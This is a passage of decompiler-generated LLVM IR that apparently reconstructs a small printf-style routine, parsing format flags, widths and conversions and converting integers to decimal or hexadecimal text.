  %v0_b0b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_b0b4 = add i32 %v0_b0b4, 1
  store i32 %v1_b0b4, i32* %r6.global-to-local, align 4
  %v0_b0b8 = load i32, i32* @r4, align 4
  %v1_b0b8 = add i32 %v0_b0b8, -1
  store i32 %v1_b0b8, i32* @r4, align 4
  %v0_b0c0 = load i32, i32* %r7.global-to-local, align 4
  %v0_b0c4 = load i32, i32* %r8.global-to-local, align 4
  %tmp52 = icmp slt i32 %v1_b0b8, 1
  br i1 %tmp52, label %dec_label_pc_b0d8.preheader.loopexit, label %dec_label_pc_b0b0

dec_label_pc_b0d8.preheader.loopexit:             ; preds = %dec_label_pc_b0b0
  %v0_b0d862.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b0d8.preheader

dec_label_pc_b0d8.preheader:                      ; preds = %dec_label_pc_b0d8.preheader.loopexit, %dec_label_pc_b0bc.preheader, %dec_label_pc_b09c
  %v0_b1005776 = phi i32 [ %storemerge, %dec_label_pc_b09c ], [ %storemerge, %dec_label_pc_b0bc.preheader ], [ %v0_b0c4, %dec_label_pc_b0d8.preheader.loopexit ]
  %v0_b0f85474 = phi i32 [ %v0_b0bc7, %dec_label_pc_b09c ], [ %v0_b0bc7, %dec_label_pc_b0bc.preheader ], [ %v1_b0b8, %dec_label_pc_b0d8.preheader.loopexit ]
  %v0_b0d862 = phi i32 [ %tmp, %dec_label_pc_b09c ], [ %tmp, %dec_label_pc_b0bc.preheader ], [ %v0_b0d862.pre, %dec_label_pc_b0d8.preheader.loopexit ]
  %v0_b10c39.ph = phi i32 [ 0, %dec_label_pc_b09c ], [ 0, %dec_label_pc_b0bc.preheader ], [ %v1_b0b4, %dec_label_pc_b0d8.preheader.loopexit ]
  %v0_b0e0.ph = phi i32 [ %arg1, %dec_label_pc_b09c ], [ %arg1, %dec_label_pc_b0bc.preheader ], [ %v0_b0c0, %dec_label_pc_b0d8.preheader.loopexit ]
  %v1_b0d863 = inttoptr i32 %v0_b0d862 to i8*
  %v2_b0d864 = load i8, i8* %v1_b0d863, align 1
  %v2_b0dc66 = icmp eq i8 %v2_b0d864, 0
  %v1_b0e467 = add i32 %v0_b0d862, 1
  store i32 %v1_b0e467, i32* %r5.global-to-local, align 4
  br i1 %v2_b0dc66, label %dec_label_pc_b0f8.preheader, label %dec_label_pc_b0d0

dec_label_pc_b0d0:                                ; preds = %dec_label_pc_b0d8.preheader, %dec_label_pc_b0d0
  %v3_b0d869.in = phi i8 [ %v2_b0d8, %dec_label_pc_b0d0 ], [ %v2_b0d864, %dec_label_pc_b0d8.preheader ]
  %v0_b0e068 = phi i32 [ %v0_b0e0.pre, %dec_label_pc_b0d0 ], [ %v0_b0e0.ph, %dec_label_pc_b0d8.preheader ]
  %v3_b0d869 = zext i8 %v3_b0d869.in to i32
  %v2_b0d0 = inttoptr i32 %v0_b0e068 to i32*
  %v3_b0d0 = call i32 @function_b010(i32* %v2_b0d0, i32 %v3_b0d869)
  %v0_b0d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 1
  store i32 %v1_b0d4, i32* %r6.global-to-local, align 4
  %v0_b0e0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_b0d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_b0d8 = inttoptr i32 %v0_b0d8 to i8*
  %v2_b0d8 = load i8, i8* %v1_b0d8, align 1
  %v2_b0dc = icmp eq i8 %v2_b0d8, 0
  %v1_b0e4 = add i32 %v0_b0d8, 1
  store i32 %v1_b0e4, i32* %r5.global-to-local, align 4
  br i1 %v2_b0dc, label %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge, label %dec_label_pc_b0d0

dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge: ; preds = %dec_label_pc_b0d0
  %v0_b0f854.pre = load i32, i32* @r4, align 4
  %v0_b10057.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_b0f8.preheader

dec_label_pc_b0f8.preheader:                      ; preds = %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge, %dec_label_pc_b0d8.preheader
  %v0_b10057 = phi i32 [ %v0_b10057.pre, %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge ], [ %v0_b1005776, %dec_label_pc_b0d8.preheader ]
  %v0_b0f854 = phi i32 [ %v0_b0f854.pre, %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge ], [ %v0_b0f85474, %dec_label_pc_b0d8.preheader ]
  %v0_b10c39.lcssa = phi i32 [ %v1_b0d4, %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge ], [ %v0_b10c39.ph, %dec_label_pc_b0d8.preheader ]
  %v0_b0e0.lcssa = phi i32 [ %v0_b0e0.pre, %dec_label_pc_b0d8.dec_label_pc_b0f8.preheader_crit_edge ], [ %v0_b0e0.ph, %dec_label_pc_b0d8.preheader ]
  %v1_b10458 = add i32 %v0_b0f854, -1
  store i32 %v1_b10458, i32* @r4, align 4
  %tmp5359 = icmp slt i32 %v0_b0f854, 1
  br i1 %tmp5359, label %dec_label_pc_b10c, label %dec_label_pc_b0f0

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0f8.preheader, %dec_label_pc_b0f0
  %v0_b10061 = phi i32 [ %v0_b100, %dec_label_pc_b0f0 ], [ %v0_b10057, %dec_label_pc_b0f8.preheader ]
  %v0_b0fc60 = phi i32 [ %v0_b0fc.pre, %dec_label_pc_b0f0 ], [ %v0_b0e0.lcssa, %dec_label_pc_b0f8.preheader ]
  %v2_b0f0 = inttoptr i32 %v0_b0fc60 to i32*
  %v3_b0f0 = call i32 @function_b010(i32* %v2_b0f0, i32 %v0_b10061)
  %v0_b0f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f4, 1
  store i32 %v1_b0f4, i32* %r6.global-to-local, align 4
  %v0_b0fc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_b0f8 = load i32, i32* @r4, align 4
  %v0_b100 = load i32, i32* %r8.global-to-local, align 4
  %v1_b104 = add i32 %v0_b0f8, -1
  store i32 %v1_b104, i32* @r4, align 4
  %tmp53 = icmp slt i32 %v0_b0f8, 1
  br i1 %tmp53, label %dec_label_pc_b10c, label %dec_label_pc_b0f0

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0f0, %dec_label_pc_b0f8.preheader
  %v0_b10c.lcssa = phi i32 [ %v0_b10c39.lcssa, %dec_label_pc_b0f8.preheader ], [ %v1_b0f4, %dec_label_pc_b0f0 ]
  %v2_b110 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b110, i32* @r4, align 4
  ret i32 %v0_b10c.lcssa

; uselistorder directives
  uselistorder i32 %v0_b0f854, { 1, 0 }
  uselistorder i8 %v2_b0d8, { 1, 0 }
  uselistorder i32 %v0_b0e0.pre, { 1, 0 }
  uselistorder i32 %v0_b0e0.ph, { 1, 0 }
  uselistorder i32 %v0_b0d862, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0, 3 }
  uselistorder i32 %v8_b088.v6_b0842, { 0, 2, 1 }
  uselistorder i32 %v6_b088, { 1, 0 }
  uselistorder i32 %v1_b070, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b058, { 1, 3, 0, 2, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_b0f0, { 1, 0 }
  uselistorder label %dec_label_pc_b0d0, { 1, 0 }
  uselistorder label %dec_label_pc_b0b0, { 1, 0 }
  uselistorder label %dec_label_pc_b09c, { 1, 0 }
  uselistorder label %dec_label_pc_b098, { 1, 0 }
  uselistorder label %dec_label_pc_b070, { 1, 0 }
}

define i32 @function_b114() local_unnamed_addr {
dec_label_pc_b114:
  %fp.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-37 = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v3_b114 = load i32, i32* @r4, align 4
  %v6_b114 = load i32, i32* @r5, align 4
  %v9_b114 = load i32, i32* @r6, align 4
  %v12_b114 = load i32, i32* @r7, align 4
  %v15_b114 = load i32, i32* @r8, align 4
  %v0_b118 = load i32, i32* @r1, align 4
  store i32 %v0_b118, i32* @r4, align 4
  %v1_b118 = icmp slt i32 %v0_b118, 0
  %v2_b118 = icmp eq i32 %v0_b118, 0
  %v0_b120 = load i32, i32* @r2, align 4
  store i32 %v0_b120, i32* @r5, align 4
  %v0_b124 = load i32, i32* @r0, align 4
  store i32 %v0_b124, i32* %sb.global-to-local, align 4
  store i32 %tmp36, i32* @r6, align 4
  store i32 %tmp26, i32* %sl.global-to-local, align 4
  br i1 %v2_b118, label %dec_label_pc_b134, label %dec_label_pc_b154

dec_label_pc_b134:                                ; preds = %dec_label_pc_b114
  store i32 48, i32* %stack_var_-48, align 4
  %v4_b14c = bitcast i32* %stack_var_-48 to i8*
  %v5_b14c = call i32 @function_b054(i32 %v0_b124, i8* %v4_b14c, i32 %tmp36, i32 %tmp26)
  br label %dec_label_pc_b22c

dec_label_pc_b154:                                ; preds = %dec_label_pc_b114
  %v0_b154 = load i32, i32* @r3, align 4
  %v2_b154 = icmp eq i32 %v0_b154, 0
  br i1 %v2_b154, label %bb39, label %bb

bb:                                               ; preds = %dec_label_pc_b154
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_b154, %bb
  %v0_b164.pr = phi i32 [ 0, %dec_label_pc_b154 ], [ 1, %bb ]
  %v7_b15c = icmp eq i32 %v0_b120, 10
  br i1 %v7_b15c, label %bb40, label %.thread

.thread:                                          ; preds = %bb39
  br label %dec_label_pc_b180

bb40:                                             ; preds = %bb39
  %v2_b164 = icmp eq i32 %v0_b164.pr, 0
  br i1 %v2_b164, label %dec_label_pc_b180, label %dec_label_pc_b16c

dec_label_pc_b16c:                                ; preds = %bb40
  br i1 %v1_b118, label %.thread23, label %dec_label_pc_b180

.thread23:                                        ; preds = %dec_label_pc_b16c
  %v4_b170 = sub i32 0, %v0_b118
  store i32 %v4_b170, i32* @r4, align 4
  br label %dec_label_pc_b180

dec_label_pc_b180:                                ; preds = %bb40, %.thread, %dec_label_pc_b16c, %.thread23
  %v0_b1c06 = phi i32 [ %v4_b170, %.thread23 ], [ %v0_b118, %dec_label_pc_b16c ], [ %v0_b118, %.thread ], [ %v0_b118, %bb40 ]
  %storemerge24 = phi i32 [ 1, %.thread23 ], [ 0, %dec_label_pc_b16c ], [ 0, %.thread ], [ 0, %bb40 ]
  store i32 %storemerge24, i32* @r8, align 4
  %v2_b184 = ptrtoint i32* %stack_var_-37 to i32
  store i32 %v2_b184, i32* @r7, align 4
  store i32 0, i32* %stack_var_-37, align 4
  %v2_b1bc5 = icmp eq i32 %v0_b1c06, 0
  br i1 %v2_b1bc5, label %dec_label_pc_b1cc, label %dec_label_pc_b190

dec_label_pc_b190:                                ; preds = %dec_label_pc_b180, %dec_label_pc_b1bc
  %v0_b1c49 = phi i32 [ %v0_b1c4, %dec_label_pc_b1bc ], [ %v0_b120, %dec_label_pc_b180 ]
  %v0_b1c08 = phi i32 [ %v0_b1b4, %dec_label_pc_b1bc ], [ %v0_b1c06, %dec_label_pc_b180 ]
  %v2_b190 = call i32 @function_b5dc(i32 %v0_b1c08, i32 %v0_b1c49)
  %v7_b1a0 = icmp sgt i32 %v2_b190, 9
  br i1 %v7_b1a0, label %bb41, label %dec_label_pc_b1bc

bb41:                                             ; preds = %dec_label_pc_b190
  %v1_b19c = load i32, i32* %fp.global-to-local, align 4
  %v2_b19c = add i32 %v1_b19c, %v2_b190
  %v9_b1a0 = add i32 %v2_b19c, -58
  br label %dec_label_pc_b1bc

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b190, %bb41
  %v0_b1a8 = phi i32 [ %v2_b190, %dec_label_pc_b190 ], [ %v9_b1a0, %bb41 ]
  %v0_b1a4 = load i32, i32* @r4, align 4
  store i32 %v0_b1a4, i32* @r0, align 4
  %v1_b1a8 = add i32 %v0_b1a8, 48
  %v0_b1ac = load i32, i32* @r5, align 4
  store i32 %v0_b1ac, i32* @r1, align 4
  %v1_b1b0 = trunc i32 %v1_b1a8 to i8
  %v2_b1b0 = load i32, i32* @r7, align 4
  %v3_b1b0 = add i32 %v2_b1b0, -1
  %v4_b1b0 = inttoptr i32 %v3_b1b0 to i8*
  store i8 %v1_b1b0, i8* %v4_b1b0, align 1
  %v5_b1b0 = load i32, i32* @r7, align 4
  %v6_b1b0 = add i32 %v5_b1b0, -1
  store i32 %v6_b1b0, i32* @r7, align 4
  %v0_b1b4 = call i32 @function_b4cc()
  store i32 %v0_b1b4, i32* @r4, align 4
  %v2_b1bc = icmp eq i32 %v0_b1b4, 0
  %v0_b1c4 = load i32, i32* @r5, align 4
  br i1 %v2_b1bc, label %dec_label_pc_b1bc.dec_label_pc_b1cc_crit_edge, label %dec_label_pc_b190

dec_label_pc_b1bc.dec_label_pc_b1cc_crit_edge:    ; preds = %dec_label_pc_b1bc
  %v0_b1cc.pre = load i32, i32* @r8, align 4
  %v0_b1d0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b1cc

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_b1bc.dec_label_pc_b1cc_crit_edge, %dec_label_pc_b180
  %v2_b208 = phi i32 [ %v0_b1d0.pre, %dec_label_pc_b1bc.dec_label_pc_b1cc_crit_edge ], [ %v2_b184, %dec_label_pc_b180 ]
  %v1_b1d4 = phi i32 [ %v0_b1cc.pre, %dec_label_pc_b1bc.dec_label_pc_b1cc_crit_edge ], [ %storemerge24, %dec_label_pc_b180 ]
  %v2_b1cc = icmp eq i32 %v1_b1d4, 0
  br i1 %v2_b1cc, label %bb42, label %dec_label_pc_b1dc

bb42:                                             ; preds = %dec_label_pc_b1cc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b214

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b1cc
  %v0_b1dc = load i32, i32* @r6, align 4
  %v2_b1dc = icmp eq i32 %v0_b1dc, 0
  br i1 %v2_b1dc, label %dec_label_pc_b204, label %dec_label_pc_b1e4

dec_label_pc_b1e4:                                ; preds = %dec_label_pc_b1dc
  %v0_b1e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_b1e4 = and i32 %v0_b1e4, 2
  %v2_b1e4 = icmp eq i32 %v1_b1e4, 0
  br i1 %v2_b1e4, label %dec_label_pc_b204, label %dec_label_pc_b1ec

dec_label_pc_b1ec:                                ; preds = %dec_label_pc_b1e4
  %v0_b1ec = load i32, i32* %sb.global-to-local, align 4
  %v2_b1f4 = inttoptr i32 %v0_b1ec to i32*
  %v3_b1f4 = call i32 @function_b010(i32* %v2_b1f4, i32 45)
  %v0_b1f8 = load i32, i32* @r6, align 4
  %v1_b1f8 = add i32 %v0_b1f8, -1
  store i32 %v1_b1f8, i32* @r6, align 4
  store i32 1, i32* @r4, align 4
  %v0_b218.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b214

dec_label_pc_b204:                                ; preds = %dec_label_pc_b1e4, %dec_label_pc_b1dc
  %v3_b208 = add i32 %v2_b208, -1
  %v4_b208 = inttoptr i32 %v3_b208 to i8*
  store i8 45, i8* %v4_b208, align 1
  %v0_b20c = load i32, i32* @r7, align 4
  %v1_b20c = add i32 %v0_b20c, -1
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %bb42, %dec_label_pc_b1ec, %dec_label_pc_b204
  %v0_b218 = phi i32 [ %v2_b208, %bb42 ], [ %v0_b218.pre, %dec_label_pc_b1ec ], [ %v1_b20c, %dec_label_pc_b204 ]
  %v0_b214 = load i32, i32* %sb.global-to-local, align 4
  %v0_b21c = load i32, i32* @r6, align 4
  %v0_b220 = load i32, i32* %sl.global-to-local, align 4
  %v4_b224 = inttoptr i32 %v0_b218 to i8*
  %v5_b224 = call i32 @function_b054(i32 %v0_b214, i8* %v4_b224, i32 %v0_b21c, i32 %v0_b220)
  %v0_b228 = load i32, i32* @r4, align 4
  %v2_b228 = add i32 %v0_b228, %v5_b224
  br label %dec_label_pc_b22c

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b134, %dec_label_pc_b214
  %storemerge = phi i32 [ %v5_b14c, %dec_label_pc_b134 ], [ %v2_b228, %dec_label_pc_b214 ]
  store i32 %v3_b114, i32* @r4, align 4
  store i32 %v6_b114, i32* @r5, align 4
  store i32 %v9_b114, i32* @r6, align 4
  store i32 %v12_b114, i32* @r7, align 4
  store i32 %v15_b114, i32* @r8, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_b1b4, { 1, 2, 0 }
  uselistorder i32 %v2_b190, { 1, 0, 2 }
  uselistorder i32 %v0_b118, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 (i32, i32)* @function_b5dc, { 7, 1, 0, 6, 11, 10, 9, 8, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_b22c, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1bc, { 1, 0 }
  uselistorder label %dec_label_pc_b190, { 1, 0 }
  uselistorder label %dec_label_pc_b180, { 3, 2, 0, 1 }
  uselistorder label %bb39, { 1, 0 }
}

define i32 @function_b234(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_b234:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-18 = alloca i32, align 4
  %v3_b234 = load i32, i32* @r4, align 4
  %v9_b234 = load i32, i32* @r6, align 4
  %v0_b238 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b238, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v1_b3e823 = inttoptr i32 %arg2 to i8*
  %v2_b3e824 = load i8, i8* %v1_b3e823, align 1
  %v2_b3ec26 = icmp eq i8 %v2_b3e824, 0
  br i1 %v2_b3ec26, label %dec_label_pc_b3f4, label %dec_label_pc_b250.lr.ph

dec_label_pc_b250.lr.ph:                          ; preds = %dec_label_pc_b234
  %v0_b248 = load i32, i32* %r2.global-to-local, align 4
  %v5_b248 = inttoptr i32 %v0_b248 to i8*
  %v2_b3c4 = ptrtoint i32* %stack_var_-18 to i32
  br label %dec_label_pc_b250

dec_label_pc_b250:                                ; preds = %dec_label_pc_b250.lr.ph, %dec_label_pc_b3e4
  %v0_b40047 = phi i32 [ 0, %dec_label_pc_b250.lr.ph ], [ %v0_b40046, %dec_label_pc_b3e4 ]
  %v0_b258 = phi i32 [ %arg2, %dec_label_pc_b250.lr.ph ], [ %v1_b3e4, %dec_label_pc_b3e4 ]
  %v0_b250.in = phi i8 [ %v2_b3e824, %dec_label_pc_b250.lr.ph ], [ %v2_b3e8, %dec_label_pc_b3e4 ]
  %stack_var_-24.327 = phi i8* [ %v5_b248, %dec_label_pc_b250.lr.ph ], [ %stack_var_-24.2, %dec_label_pc_b3e4 ]
  %v7_b250 = icmp eq i8 %v0_b250.in, 37
  br i1 %v7_b250, label %dec_label_pc_b258, label %dec_label_pc_b3d4

dec_label_pc_b258:                                ; preds = %dec_label_pc_b250
  %v1_b258 = add i32 %v0_b258, 1
  %v2_b258 = inttoptr i32 %v1_b258 to i8*
  %v3_b258 = load i8, i8* %v2_b258, align 1
  store i32 %v1_b258, i32* @r4, align 4
  %v2_b25c = icmp eq i8 %v3_b258, 0
  br i1 %v2_b25c, label %dec_label_pc_b3f4.loopexit, label %dec_label_pc_b264

dec_label_pc_b264:                                ; preds = %dec_label_pc_b258
  %v7_b264 = icmp eq i8 %v3_b258, 37
  br i1 %v7_b264, label %dec_label_pc_b3d4, label %dec_label_pc_b26c

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b264
  %v7_b26c = icmp eq i8 %v3_b258, 45
  br i1 %v7_b26c, label %bb61, label %dec_label_pc_b288.preheader

bb61:                                             ; preds = %dec_label_pc_b26c
  %v2_b274 = add i32 %v0_b258, 2
  store i32 %v2_b274, i32* @r4, align 4
  br label %dec_label_pc_b288.preheader

dec_label_pc_b288.preheader:                      ; preds = %dec_label_pc_b26c, %bb61
  %v0_b28815 = phi i32 [ %v2_b274, %bb61 ], [ %v1_b258, %dec_label_pc_b26c ]
  %storemerge = phi i32 [ 1, %bb61 ], [ 0, %dec_label_pc_b26c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_b28816 = inttoptr i32 %v0_b28815 to i8*
  %v2_b28817 = load i8, i8* %v1_b28816, align 1
  %v7_b28c21 = icmp eq i8 %v2_b28817, 48
  br i1 %v7_b28c21, label %dec_label_pc_b280, label %dec_label_pc_b2ac.preheader

dec_label_pc_b280:                                ; preds = %dec_label_pc_b288.preheader, %dec_label_pc_b280
  %v0_b284 = phi i32 [ %v1_b284, %dec_label_pc_b280 ], [ %storemerge, %dec_label_pc_b288.preheader ]
  %v0_b280 = phi i32 [ %v1_b280, %dec_label_pc_b280 ], [ %v0_b28815, %dec_label_pc_b288.preheader ]
  %v1_b280 = add i32 %v0_b280, 1
  store i32 %v1_b280, i32* @r4, align 4
  %v1_b284 = or i32 %v0_b284, 2
  store i32 %v1_b284, i32* %r0.global-to-local, align 4
  %v1_b288 = inttoptr i32 %v1_b280 to i8*
  %v2_b288 = load i8, i8* %v1_b288, align 1
  %v7_b28c = icmp eq i8 %v2_b288, 48
  br i1 %v7_b28c, label %dec_label_pc_b280, label %dec_label_pc_b2ac.preheader

dec_label_pc_b2ac.preheader:                      ; preds = %dec_label_pc_b280, %dec_label_pc_b288.preheader
  %v0_b2ac40 = phi i32 [ %v0_b28815, %dec_label_pc_b288.preheader ], [ %v1_b280, %dec_label_pc_b280 ]
  %v0_b2d0 = phi i32 [ %storemerge, %dec_label_pc_b288.preheader ], [ %v1_b284, %dec_label_pc_b280 ]
  br label %dec_label_pc_b2ac

dec_label_pc_b29c:                                ; preds = %dec_label_pc_b2ac
  %v3_b2a0 = mul i32 %v0_b2a0, 10
  %v4_b2a0 = add i32 %v3_b2ac, %v3_b2a0
  %v1_b2a4 = add i32 %v0_b2a4, 1
  store i32 %v1_b2a4, i32* @r4, align 4
  %v1_b2a8 = add i32 %v4_b2a0, -48
  br label %dec_label_pc_b2ac

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_b2ac.preheader, %dec_label_pc_b29c
  %v0_b2a4 = phi i32 [ %v1_b2a4, %dec_label_pc_b29c ], [ %v0_b2ac40, %dec_label_pc_b2ac.preheader ]
  %v0_b2a0 = phi i32 [ %v1_b2a8, %dec_label_pc_b29c ], [ 0, %dec_label_pc_b2ac.preheader ]
  %v1_b2ac = inttoptr i32 %v0_b2a4 to i8*
  %v2_b2ac = load i8, i8* %v1_b2ac, align 1
  %v3_b2ac = zext i8 %v2_b2ac to i32
  store i32 %v3_b2ac, i32* %r2.global-to-local, align 4
  %v1_b2b0 = add nsw i32 %v3_b2ac, -48
  %tmp65 = icmp ult i32 %v1_b2b0, 10
  br i1 %tmp65, label %dec_label_pc_b29c, label %dec_label_pc_b2bc

dec_label_pc_b2bc:                                ; preds = %dec_label_pc_b2ac
  %v7_b2bc = icmp eq i8 %v2_b2ac, 115
  br i1 %v7_b2bc, label %dec_label_pc_b2c4, label %dec_label_pc_b2e4

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b2bc
  store i32 %v0_b2a0, i32* %r2.global-to-local, align 4
  %v1_b2cc = bitcast i8* %stack_var_-24.327 to i32*
  %v2_b2cc = load i32, i32* %v1_b2cc, align 4
  br label %dec_label_pc_b3cc

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2bc
  %v7_b2e4 = icmp eq i8 %v2_b2ac, 100
  br i1 %v7_b2e4, label %dec_label_pc_b2ec, label %dec_label_pc_b320

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b2e4
  %v0_b2fc = load i32, i32* @r6, align 4
  store i32 %v0_b2fc, i32* @r0, align 4
  %v1_b300 = bitcast i8* %stack_var_-24.327 to i32*
  %v2_b300 = load i32, i32* %v1_b300, align 4
  store i32 %v2_b300, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  br label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b36c, %dec_label_pc_b348, %dec_label_pc_b2ec
  %storemerge2 = phi i32 [ 1, %dec_label_pc_b2ec ], [ 0, %dec_label_pc_b348 ], [ 0, %dec_label_pc_b36c ]
  store i32 %storemerge2, i32* @r3, align 4
  %v0_b314 = call i32 @function_b114()
  br label %dec_label_pc_b318

dec_label_pc_b318:                                ; preds = %dec_label_pc_b3cc, %dec_label_pc_b310
  %storemerge3 = phi i32 [ %v5_b3cc, %dec_label_pc_b3cc ], [ %v0_b314, %dec_label_pc_b310 ]
  %stack_var_-24.0.in.in = ptrtoint i8* %stack_var_-24.327 to i32
  %stack_var_-24.0.in = add i32 %stack_var_-24.0.in.in, 4
  %stack_var_-24.0 = inttoptr i32 %stack_var_-24.0.in to i8*
  store i32 %storemerge3, i32* %r0.global-to-local, align 4
  %v0_b318 = load i32, i32* @r5, align 4
  %v2_b318 = add i32 %v0_b318, %storemerge3
  store i32 %v2_b318, i32* @r5, align 4
  br label %dec_label_pc_b3e4

dec_label_pc_b320:                                ; preds = %dec_label_pc_b2e4
  %v7_b320 = icmp eq i8 %v2_b2ac, 120
  br i1 %v7_b320, label %dec_label_pc_b348, label %dec_label_pc_b334

dec_label_pc_b334:                                ; preds = %dec_label_pc_b320
  %v7_b334 = icmp eq i8 %v2_b2ac, 88
  br i1 %v7_b334, label %dec_label_pc_b348, label %dec_label_pc_b364

dec_label_pc_b348:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b320
  %v1_b350 = bitcast i8* %stack_var_-24.327 to i32*
  %v2_b350 = load i32, i32* %v1_b350, align 4
  store i32 %v2_b350, i32* @r1, align 4
  %v0_b354 = load i32, i32* @r6, align 4
  store i32 %v0_b354, i32* @r0, align 4
  store i32 16, i32* @r2, align 4
  br label %dec_label_pc_b310

dec_label_pc_b364:                                ; preds = %dec_label_pc_b334
  %v7_b364 = icmp eq i8 %v2_b2ac, 117
  br i1 %v7_b364, label %dec_label_pc_b36c, label %dec_label_pc_b398

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b364
  %v0_b380 = load i32, i32* @r6, align 4
  store i32 %v0_b380, i32* @r0, align 4
  %v1_b384 = bitcast i8* %stack_var_-24.327 to i32*
  %v2_b384 = load i32, i32* %v1_b384, align 4
  store i32 %v2_b384, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  br label %dec_label_pc_b310

dec_label_pc_b398:                                ; preds = %dec_label_pc_b364
  %v7_b398 = icmp eq i8 %v2_b2ac, 99
  br i1 %v7_b398, label %dec_label_pc_b3a0, label %dec_label_pc_b3e4

dec_label_pc_b3a0:                                ; preds = %dec_label_pc_b398
  %v1_b3a4 = bitcast i8* %stack_var_-24.327 to i32*
  %v2_b3a4 = load i32, i32* %v1_b3a4, align 4
  store i32 %v2_b3a4, i32* @lr, align 4
  store i32 %v2_b3a4, i32* %stack_var_-18, align 4
  store i32 %v0_b2a0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b3cc

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b2c4, %dec_label_pc_b3a0
  %v1_b3cc = phi i32 [ %v2_b2cc, %dec_label_pc_b2c4 ], [ %v2_b3c4, %dec_label_pc_b3a0 ]
  %storemerge4 = load i32, i32* @r6, align 4
  store i32 %storemerge4, i32* %r0.global-to-local, align 4
  %v4_b3cc = inttoptr i32 %v1_b3cc to i8*
  %v5_b3cc = call i32 @function_b054(i32 %storemerge4, i8* %v4_b3cc, i32 %v0_b2a0, i32 %v0_b2d0)
  br label %dec_label_pc_b318

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b250, %dec_label_pc_b264
  %v0_b3d8 = phi i32 [ %v0_b258, %dec_label_pc_b250 ], [ %v1_b258, %dec_label_pc_b264 ]
  %v0_b3d4 = load i32, i32* @r6, align 4
  store i32 %v0_b3d4, i32* %r0.global-to-local, align 4
  %v1_b3d8 = inttoptr i32 %v0_b3d8 to i8*
  %v2_b3d8 = load i8, i8* %v1_b3d8, align 1
  %v3_b3d8 = zext i8 %v2_b3d8 to i32
  %v2_b3dc = inttoptr i32 %v0_b3d4 to i32*
  %v3_b3dc = call i32 @function_b010(i32* %v2_b3dc, i32 %v3_b3d8)
  store i32 %v3_b3dc, i32* %r0.global-to-local, align 4
  %v0_b3e0 = load i32, i32* @r5, align 4
  %v1_b3e0 = add i32 %v0_b3e0, 1
  store i32 %v1_b3e0, i32* @r5, align 4
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b398, %dec_label_pc_b318, %dec_label_pc_b3d4
